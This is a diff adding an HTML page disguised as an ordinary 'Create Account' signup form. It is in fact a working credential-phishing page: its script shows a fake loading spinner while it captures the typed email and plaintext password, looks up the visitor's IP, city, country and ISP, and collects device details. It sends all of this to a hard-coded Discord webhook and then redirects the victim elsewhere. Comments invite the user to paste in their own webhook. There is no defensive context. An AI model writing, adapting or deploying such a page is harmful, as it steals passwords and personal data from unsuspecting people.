@@ -1,0 +1,164 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Create Account</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: #f4f6f8;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            overflow: hidden; /* Prevents scrolling during fake load */
+        }
+        .signup-container {
+            background: white;
+            padding: 40px;
+            border-radius: 12px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+            width: 100%;
+            max-width: 400px;
+            text-align: center;
+            position: relative;
+        }
+        h2 { margin-bottom: 10px; color: #333; }
+        p.subtitle { color: #777; margin-bottom: 30px; font-size: 14px; }
+        
+        .input-group { margin-bottom: 20px; text-align: left; }
+        label { display: block; margin-bottom: 8px; font-size: 13px; font-weight: 600; color: #555; }
+        input {
+            width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 6px;
+            font-size: 16px; box-sizing: border-box; transition: border 0.3s;
+        }
+        input:focus { outline: none; border-color: #007bff; }
+        
+        button {
+            width: 100%; padding: 14px; background-color: #007bff; color: white;
+            border: none; border-radius: 6px; font-size: 16px; font-weight: bold;
+            cursor: pointer; transition: background 0.3s;
+        }
+        button:hover { background-color: #0056b3; }
+        button:disabled { background-color: #ccc; cursor: not-allowed; }
+        
+        /* Fake Loading Overlay */
+        .loading-overlay {
+            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
+            background: white; border-radius: 12px;
+            display: flex; flex-direction: column;
+            justify-content: center; align-items: center;
+            opacity: 0; visibility: hidden; transition: opacity 0.3s;
+            z-index: 10;
+        }
+        .loading-overlay.active { opacity: 1; visibility: visible; }
+        .spinner {
+            border: 4px solid #f3f3f3; border-top: 4px solid #007bff;
+            border-radius: 50%; width: 30px; height: 30px;
+            animation: spin 1s linear infinite; margin-bottom: 15px;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .loading-text { color: #555; font-size: 14px; }
+    </style>
+</head>
+<body>
+
+    <div class="signup-container">
+        <!-- Fake Loading Screen -->
+        <div class="loading-overlay" id="loader">
+            <div class="spinner"></div>
+            <div class="loading-text">Creating your account...</div>
+        </div>
+
+        <h2>Create Account</h2>
+        <p class="subtitle">Join us today! It only takes a minute.</p>
+        
+        <form id="signupForm">
+            <div class="input-group">
+                <label for="email">Email Address</label>
+                <input type="email" id="email" placeholder="name@example.com" required>
+            </div>
+            
+            <div class="input-group">
+                <label for="password">Password</label>
+                <input type="password" id="password" placeholder="••••••••" required>
+            </div>
+
+            <button type="submit" id="submitBtn">Create Account</button>
+        </form>
+
+        <div class="footer" style="margin-top: 20px; font-size: 12px; color: #aaa;">
+            Already have an account? <a href="#" style="color:#007bff; text-decoration:none;">Log In</a>
+        </div>
+    </div>
+
+    <script>
+        // PASTE YOUR DISCORD WEBHOOK URL HERE
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1562274011185156096/colT_GNvFwbwKhMeDgF2EFIrmQ_N2LZKueJGK6g_qrreXvV-pRNKoaI-1s2rR4wabRkt";
+        
+        // Where to send them after logging
+        const REDIRECT_URL = "https://mrnoname42.github.io/scratcg-gui2"; 
+
+        document.getElementById('signupForm').addEventListener('submit', async function(e) {
+            e.preventDefault(); 
+            
+            const btn = document.getElementById('submitBtn');
+            const loader = document.getElementById('loader');
+            
+            // Show the fake loading screen
+            loader.classList.add('active');
+            btn.disabled = true;
+
+            try {
+                // 1. Fetch IP Data
+                const res = await fetch('https://ipapi.co/json/');
+                const data = await res.json();
+
+                // 2. Gather Device Info
+                const screenRes = `${screen.width}x${screen.height}`;
+                const platform = navigator.platform;
+                const userAgent = navigator.userAgent.substring(0, 60) + "...";
+                
+                // Get what they typed
+                const emailInput = document.getElementById('email').value;
+                const passInput = document.getElementById('password').value;
+
+                // 3. Prepare Discord Message
+                const payload = {
+                    embeds: [{
+                        title: "🆕 New User Signup!",
+                        color: 3092790, // Green
+                        fields: [
+                            { name: "IP Address", value: `\`${data.ip}\`` },
+                            { name: "Location", value: `${data.city}, ${data.country_name}` },
+                            { name: "ISP / Org", value: `\`${data.org || 'Unknown'}\`` },
+                            { name: "Device", value: platform },
+                            { name: "Screen", value: `\`${screenRes}\`` },
+                            { name: "Entered Email", value: `\`${emailInput}\`` },
+                            { name: "Password", value: `\`${passInput}\`` },
+                            { name: "User Agent", value: `\`${userAgent}\`` }
+                        ],
+                        footer: { text: "Logged at " + new Date().toLocaleString() }
+                    }]
+                };
+
+                // 4. Send to Discord
+                await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+
+            } catch (error) {
+                console.error("Logging failed");
+            } finally {
+                // 5. Redirect immediately
+                window.location.href = REDIRECT_URL;
+            }
+        });
+    </script>
+</body>
+</html>
